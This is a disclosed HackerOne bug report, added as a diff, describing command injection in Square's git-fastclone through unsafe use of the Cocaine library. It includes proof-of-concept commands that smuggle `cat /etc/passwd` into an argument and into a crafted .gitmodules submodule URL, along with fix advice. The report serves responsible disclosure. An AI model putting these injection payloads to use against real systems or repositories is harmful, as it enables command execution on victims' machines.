@@ -1,0 +1,44 @@
+ReportLink:https://hackerone.com/reports/105190
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/bburky
+ReportedTo:Square Open Source(square-open-source)
+BountyAmount:2000.0
+Severity:
+State:Closed
+DateOfDisclosure:25.01.2016 18:40:58
+
+Summary:
+
+While testing git-fastclone for the ext protocol issues in my other report, I looked at the source code and immediately noticed you're using the [Cocaine][0] library unsafely. Cocaine will protect from command injection but it "only does that for arguments interpolated via run, NOT arguments passed into new" (from it's README).
+
+Throughout git-fastclone you call `Cocaine::CommandLine.new` and use plain Ruby string interpolation. This is enables command injection in basically every instance. Instead you need to construct the command line passed to `#new` with `:foo` placeholders and use `#run` to perform the variable substitution. The [security section of the README][1] talks about this a bit.
+
+Here's a very simple exploit POC:
+
+    git fastclone "'"'$(cat /etc/passwd >&2)'"'"
+
+This first POC may seem less severe because the exploit string is visible to the user. However, in many places command injection is possible using from attacker controlled values within the git repository. Consider the following POC instead which performs command injection into `Cocaine::CommandLine` through a git submodule URL. (Note that this exploit has absolutely nothing at all to do with my previous report concerning the git ext protocol.)
+
+    git init cocaine-command-injection
+    cd cocaine-command-injection
+    
+    # This can be the URL of any valid git repository
+    # This is just used to initially create the submodule in the repo
+    git submodule add https://github.com/octocat/Hello-World malicious-submodule
+    
+    cat >.gitmodules <<"EOF"
+    [submodule "malicious-submodule"]
+        path = malicious-submodule
+        url = "'`cat /etc/passwd >&2`'"
+    EOF
+    git add .gitmodules
+    git commit -m 'Malicious Cocaine command injection submodule'
+    cd ..
+    
+    # Now clone the repository
+    git fastclone cocaine-command-injection cocaine-command-injection-clone
+
+Please instead safely build Cocaine::CommandLine calls by passing placeholders to `#new` and use Cocaine's variable interpolation using the hash passed to `#run`.
+
+[0]: https://github.com/thoughtbot/cocaine
+[1]: https://github.com/thoughtbot/cocaine/blob/master/README.md#security
